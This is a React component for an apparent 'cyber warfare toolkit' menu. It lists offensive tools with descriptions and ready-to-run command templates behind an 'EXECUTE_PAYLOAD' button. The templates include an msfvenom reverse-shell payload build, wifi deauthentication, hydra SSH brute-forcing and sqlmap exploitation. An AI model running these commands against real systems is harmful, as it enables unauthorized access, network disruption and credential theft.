import React, { useState } from 'react';

interface HackingToolkitProps {
  isOpen: boolean;
  onClose: () => void;
  onExecute: (cmd: string, toolName: string) => void;
}

type ToolCategory = 'NETWORK' | 'WEB' | 'WIFI' | 'PAYLOAD' | 'CRACKING' | 'ENUM' | 'OSINT' | 'SOCIAL' | 'ANON' | 'FORENSICS';

const toolInfoMap: Record<string, string> = {
    'NMAP': 'The standard for network discovery. Scans ports, detects OS versions, and identifies running services.',
    'SQLMAP': 'Automates the detection and exploitation of SQL injection flaws in web servers.',
    'WIFITE': 'A complete automated wireless attack tool. It attacks WEP, WPA, and WPS encrypted networks in sequence.',
    'AIREPLAY': 'Part of Aircrack-ng. Used to generate traffic or deauthenticate users (kick them off wifi) to capture handshakes.',
    'FLUXION': 'A social engineering attack against WPA networks. Creates a fake login page (Evil Twin) to trick users into revealing passwords.',
    'HYDRA': 'A fast network logon cracker. Supports numerous protocols (SSH, FTP, HTTP, etc.). Ideal for brute-forcing.',
    'JOHN': 'John the Ripper. Excellent for offline password cracking (e.g., cracking a stolen hash file).',
    'CUPP': 'Common User Password Profiler. Generates a custom wordlist based on personal info (birthdays, pet names) for social engineering.',
    'SHERLOCK': 'Hunt down social media accounts by username across 300+ social networks.',
    'THEHARVESTER': 'Gathers emails, subdomains, hosts, employee names, open ports and banners from public sources.',
    'MSFVENOM': 'Payload generator for Metasploit. Creates shellcode, executables, and scripts to establish remote connections.',
};

const toolsList = [
  { id: 'NMAP', name: 'Nmap', category: 'NETWORK' as ToolCategory, command: 'nmap -sV -sC -O -p- <TARGET_IP>' },
  { id: 'SQLMAP', name: 'Sqlmap', category: 'WEB' as ToolCategory, command: 'sqlmap -u "<TARGET_URL>" --dbs --random-agent' },
  { id: 'WIFITE', name: 'Wifite', category: 'WIFI' as ToolCategory, command: 'sudo wifite --kill --dict /usr/share/wordlists/rockyou.txt' },
  { id: 'AIREPLAY', name: 'Aireplay-ng', category: 'WIFI' as ToolCategory, command: 'aireplay-ng --deauth 10 -a <BSSID> wlan0mon' },
  { id: 'FLUXION', name: 'Fluxion', category: 'WIFI' as ToolCategory, command: './fluxion.sh' },
  { id: 'HYDRA', name: 'Hydra', category: 'CRACKING' as ToolCategory, command: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh' },
  { id: 'JOHN', name: 'John the Ripper', category: 'CRACKING' as ToolCategory, command: 'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt' },
  { id: 'CUPP', name: 'CUPP', category: 'SOCIAL' as ToolCategory, command: 'python3 cupp.py -i' },
  { id: 'SHERLOCK', name: 'Sherlock', category: 'OSINT' as ToolCategory, command: 'python3 sherlock --timeout 1 <USERNAME>' },
  { id: 'THEHARVESTER', name: 'TheHarvester', category: 'OSINT' as ToolCategory, command: 'theHarvester -d <DOMAIN> -l 500 -b google' },
  { id: 'MSFVENOM', name: 'MsfVenom', category: 'PAYLOAD' as ToolCategory, command: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > payload.exe' },
];

const categories: ToolCategory[] = ['NETWORK', 'WEB', 'WIFI', 'CRACKING', 'OSINT', 'SOCIAL', 'PAYLOAD'];

export const HackingToolkit: React.FC<HackingToolkitProps> = ({ isOpen, onClose, onExecute }) => {
  const [selectedCategory, setSelectedCategory] = useState<ToolCategory>('NETWORK');
  const [selectedTool, setSelectedTool] = useState<string | null>(null);

  if (!isOpen) return null;

  const currentTool = toolsList.find(t => t.id === selectedTool);

  return (
    <div className="fixed inset-0 z-[70] flex items-center justify-center bg-black/95 backdrop-blur-md p-4">
      <div className="w-full max-w-5xl h-[80vh] border border-green-500/50 bg-black flex flex-col shadow-[0_0_30px_rgba(0,255,0,0.1)] rounded-sm overflow-hidden">
        
        {/* Header */}
        <div className="bg-green-900/20 border-b border-green-500/30 p-4 flex justify-between items-center">
          <div className="flex items-center gap-3">
            <i className="fas fa-dragon text-green-500 text-xl"></i>
            <h2 className="font-mono text-xl font-bold text-green-500 tracking-widest">CYBER_WARFARE_TOOLKIT_v4.0</h2>
          </div>
          <button onClick={onClose} className="text-green-500 hover:text-white transition-colors">
            <i className="fas fa-times text-xl"></i>
          </button>
        </div>

        {/* Body */}
        <div className="flex-1 flex overflow-hidden font-mono text-sm">
          
          {/* Categories Sidebar */}
          <div className="w-48 border-r border-green-500/20 bg-black overflow-y-auto">
            {categories.map(cat => (
              <button
                key={cat}
                onClick={() => setSelectedCategory(cat)}
                className={`w-full text-left p-3 border-l-2 transition-all ${
                  selectedCategory === cat 
                    ? 'border-green-500 bg-green-500/10 text-white font-bold' 
                    : 'border-transparent text-green-700 hover:bg-green-900/10 hover:text-green-400'
                }`}
              >
                {cat}
              </button>
            ))}
          </div>

          {/* Tools List */}
          <div className="w-64 border-r border-green-500/20 bg-black/50 overflow-y-auto">
             {toolsList.filter(t => t.category === selectedCategory).map(tool => (
               <button
                 key={tool.id}
                 onClick={() => setSelectedTool(tool.id)}
                 className={`w-full text-left p-3 border-b border-green-900/30 hover:bg-green-500/20 transition-colors flex items-center justify-between ${selectedTool === tool.id ? 'bg-green-500/20 text-white' : 'text-green-400'}`}
               >
                 <span>{tool.name}</span>
                 <i className="fas fa-terminal text-xs opacity-50"></i>
               </button>
             ))}
          </div>

          {/* Details Panel */}
          <div className="flex-1 p-6 bg-[radial-gradient(circle_at_center,rgba(0,50,0,0.2),black)] relative">
             {/* Grid Background */}
             <div className="absolute inset-0 opacity-10 pointer-events-none" 
                  style={{ backgroundImage: 'linear-gradient(0deg, transparent 24%, rgba(0, 255, 0, .3) 25%, rgba(0, 255, 0, .3) 26%, transparent 27%, transparent 74%, rgba(0, 255, 0, .3) 75%, rgba(0, 255, 0, .3) 76%, transparent 77%, transparent), linear-gradient(90deg, transparent 24%, rgba(0, 255, 0, .3) 25%, rgba(0, 255, 0, .3) 26%, transparent 27%, transparent 74%, rgba(0, 255, 0, .3) 75%, rgba(0, 255, 0, .3) 76%, transparent 77%, transparent)', backgroundSize: '30px 30px' }}>
             </div>

             {currentTool ? (
               <div className="relative z-10 h-full flex flex-col">
                 <h3 className="text-3xl font-bold text-white mb-2">{currentTool.name}</h3>
                 <div className="text-xs text-green-600 mb-6 border border-green-900 inline-block px-2 py-1 rounded uppercase tracking-wider">
                   Category: {currentTool.category}
                 </div>
                 
                 <div className="mb-6">
                   <h4 className="text-green-500 font-bold mb-2 uppercase border-b border-green-500/30 pb-1">Description</h4>
                   <p className="text-gray-300 leading-relaxed">
                     {toolInfoMap[currentTool.id] || "No description available."}
                   </p>
                 </div>

                 <div className="mb-8">
                    <h4 className="text-green-500 font-bold mb-2 uppercase border-b border-green-500/30 pb-1">Command Template</h4>
                    <div className="bg-gray-900 p-4 border-l-4 border-green-500 font-mono text-green-300 shadow-lg">
                      {currentTool.command}
                    </div>
                 </div>

                 <div className="mt-auto">
                   <button 
                     onClick={() => onExecute(currentTool.command, currentTool.name)}
                     className="w-full py-4 bg-green-600 hover:bg-green-500 text-black font-bold text-lg uppercase tracking-widest transition-all shadow-[0_0_20px_rgba(0,255,0,0.4)] hover:shadow-[0_0_30px_rgba(0,255,0,0.6)]"
                   >
                     [ EXECUTE_PAYLOAD ]
                   </button>
                 </div>
               </div>
             ) : (
               <div className="h-full flex flex-col items-center justify-center text-green-900 select-none">
                 <i className="fas fa-crosshairs text-9xl opacity-20 mb-4 animate-pulse"></i>
                 <p className="text-xl font-bold opacity-50">SELECT_TARGET_VECTOR</p>
               </div>
             )}
          </div>

        </div>
      </div>
    </div>
  );
};